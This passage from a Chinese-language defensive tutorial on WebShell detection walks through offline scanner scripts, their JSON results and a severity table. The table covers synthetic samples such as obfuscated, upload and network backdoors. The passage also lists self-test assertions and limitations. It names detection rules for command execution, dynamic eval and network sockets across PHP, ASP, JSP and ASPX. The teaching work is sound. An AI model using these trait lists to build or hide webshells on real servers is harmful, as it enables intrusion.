预期输出（四个都一致）：

```text
SELF-TEST OK
```

退出码 0。自测**完全离线**：不联网、不需要 sudo、不依赖任何第三方库。
`static_scan.py` 是共享模块（被 01/02/03 import），它的 `--self-test` 单独验证
规则库结构、分级阈值、评分封顶、语言过滤四件事。

### 9.2 生成样本集并扫描

```bash
python3 days/day-158-webshell-检测/code/01-static-scanner.py --lab
```

预期输出是一段 JSON（节选，实测）：

```json
{
  "files": [
    { "file": "asp.asp", "status": "scanned", "score": 3, "severity": "medium",
      "summary": {"asp_wscript_shell": {"category": "command", "weight": 3, "lines": [2]}} },
    { "file": "benign-upload.php", "status": "scanned", "score": 5, "severity": "high",
      "summary": {"file_write": {"...": "..."}, "php_superglobal_input": {"...": "..."},
                  "encode_encode": {"...": "..."}} },
    { "file": "docs.txt", "status": "scanned", "score": 4, "severity": "medium",
      "summary": {"php_cmd_exec": {"category": "command", "weight": 3, "lines": [1, 1]}} },
    { "file": "obfuscated.php", "status": "scanned", "score": 9, "severity": "critical",
      "summary": {"php_dynamic_eval": {"...": "..."}, "encode_decode": {"...": "..."}} }
  ],
  "truncated": false,
  "walk_errors": []
}
```

把 12 个文件的分级汇总成表（实测）：

```text
asp.asp                medium    score=3   rules=['asp_wscript_shell']
aspx.aspx.cs           medium    score=3   rules=['aspx_process_start']
benign-upload.php      high      score=5   rules=['encode_encode','file_write','php_superglobal_input']
callback-backdoor.php  medium    score=3   rules=['php_call_user_func','php_superglobal_input']
clean.php              low       score=1   rules=['php_superglobal_input']
docs.txt               medium    score=4   rules=['php_cmd_exec']
dynamic-include.php    medium    score=3   rules=['include_dynamic','php_superglobal_input']
jsp.jsp                medium    score=3   rules=['jsp_runtime_exec']
network-backdoor.php   medium    score=4   rules=['file_write','network_socket']
obfuscated.php         critical  score=9   rules=['encode_decode','encode_encode','php_dynamic_eval','php_error_suppress']
simple-cmd.php         medium    score=3   rules=['php_cmd_exec']
upload-shell.php       medium    score=4   rules=['file_write','php_superglobal_input']
```

**读这张表的正确方式**：`obfuscated.php`（真后门骨架）在最上面，`docs.txt`（纯文档）
和 `benign-upload.php`（正常业务）**也在高危附近** —— 这就是误报的真实形态。

### 9.3 行为关联

```bash
# 上传脚本 + 子进程 + shell 参数（同主机同实例）→ 触发复核
python3 days/day-158-webshell-检测/code/02-behavior-hunter.py --events \
  '[{"host":"web01","instance":"worker-start-1","request":"/u/a.php","kind":"upload_script_write"},
    {"host":"web01","instance":"worker-start-1","kind":"child_start"}]'
```

预期输出（节选）：

```json
[
  {
    "host": "web01",
    "instance": "worker-start-1",
    "review_required": true,
    "signals": ["child_start", "upload_script_write"],
    "score": 5
  }
]
```

```bash
# 时间窗缺失 → 拒绝下结论
python3 days/day-158-webshell-检测/code/02-behavior-hunter.py --no-window --events \
  '[{"host":"web01","instance":"i","kind":"child_start"}]'
```

预期输出：

```json
[
  {"host": "web01", "instance": "unknown", "review_required": true,
   "signals": [], "score": 0, "reason": "time_window_unknown"}
]
```

### 9.4 扫描自己的离线副本

```bash
python3 days/day-158-webshell-检测/code/03-webshell-scanner.py --rules
python3 days/day-158-webshell-检测/code/03-webshell-scanner.py ./my-offline-copy --max-files 500
```

`--rules` 预期输出 20 行规则表 + 类别/权重/语言（见 5.1）。
扫描目录时输出 JSON 报告；**若目录里有太大/非 UTF-8/符号链接的文件，
退出码为 2**，且 `files[*].reason` 会写明 `too_large` / `not_utf8` / `symlink` /
`binary` / `not_regular`。默认不扫 `/var/www` 或全盘，必须显式指定目录。

## 10. 局限与自测覆盖

### 10.1 自测覆盖了什么（`--self-test` 断言清单）

| 断言 | 验证的行为 |
|---|---|
| `clean.php` 等级 ∈ {clean, low, medium} | 正常代码不会被定级为 high/critical |
| `docs.txt` 有命中且等级 ∈ {medium, high} | 文档误报确实存在（教学点可复现） |
| `simple-cmd.php` 命中 `php_cmd_exec` | 命令执行特征识别 |
| `obfuscated.php` 命中 `encode_decode` + `php_dynamic_eval` 且 ∈ {high, critical} | 混淆样本识别 + 分级 |
| ASP / JSP / ASPX 各自规则命中 | 三语言特征覆盖 |
| 上传/外联/包含/回调样本各自规则命中 | 四类形态覆盖 |
| `benign-upload.php` 命中 `file_write` 且等级 ≠ clean | **命中 ≠ 恶意**（最重要的一条） |
| `inspect_text` → `score_findings` → `classify_score` 自洽 | 评分与分级一致 |
| 跨主机 / 跨实例不误关联 | 行为关联的分组键正确 |
| 缺必要字段 → `ValueError` | 不静默吞掉数据缺陷 |
| `--no-window` → `time_window_unknown` | 信息不全时不下结论 |
| 扫描前后文件 SHA-256 一致 | **只读性** |
| `too_large` / `not_utf8` 被正确跳过 | 资源限制与编码守卫 |
| `json.loads(json.dumps(report)) == report` | 报告可序列化 |
| 不存在的目录 → `ValueError` | 参数校验 |
| `static_scan.py --self-test`：规则名唯一、权重 1–3、评分封顶=5、JSP 文件不命中 PHP 规则 | 规则引擎本身（不依赖任何样本文件） |

### 10.2 没有覆盖的（生产化前必须补齐，且**必须留在报告里**）

- **检出率评测**：没有在带标签的授权样本集上算 precision/recall，
  因此**不能**声明"能检出 X% 的 WebShell"
- **语义 / 数据流分析**：分不清"外部输入是否真的到达危险调用"，
  所以 `benign-upload.php` 这类正常业务会一直高分
- **压缩包与图片马**：不展开 zip、不解析图片元数据，藏在里面的代码看不见
- **编码归一化**：不做 Unicode/宽字符归一，异体字/全角写法可能绕过
- **内存马 / 无文件后门**：结构上看不到（见 2.4）
- **生产日志采集与时间窗切分**：行为关联用的是合成事件，没有接真实采集管道
- **误报率**：没有在真实业务代码上测过误报，权重与阈值只是教学基线

> **纪律**：未覆盖项必须保留在报告里，不得用"零告警"把它隐藏掉。
> "我没扫到"和"我扫了但没覆盖"是两件完全不同的事。

## 11. 后续练习

见 [练习清单](exercises/checklist.md) 与 [原理图](diagrams/README.md)。
练习要求用正常代码建立标签集、计算误报率/召回率、做数据流与行为关联分析——
全部在授权环境与离线只读副本上进行。特别推荐：

1. 给 `benign-upload.php` 做**数据流分析**：写出"路径是否可控"的判定逻辑
2. 给规则引擎加**注释剔除**（先剥掉 `//` 与 `/* */` 再匹配），量化 `docs.txt` 的降噪效果
3. 给 `.cs` / `.md` / `.txt` 设计扩展名策略，比较误报变化
4. 写一份"命中即删除"的反例说明：为什么自动化删除危险文件是错误设计
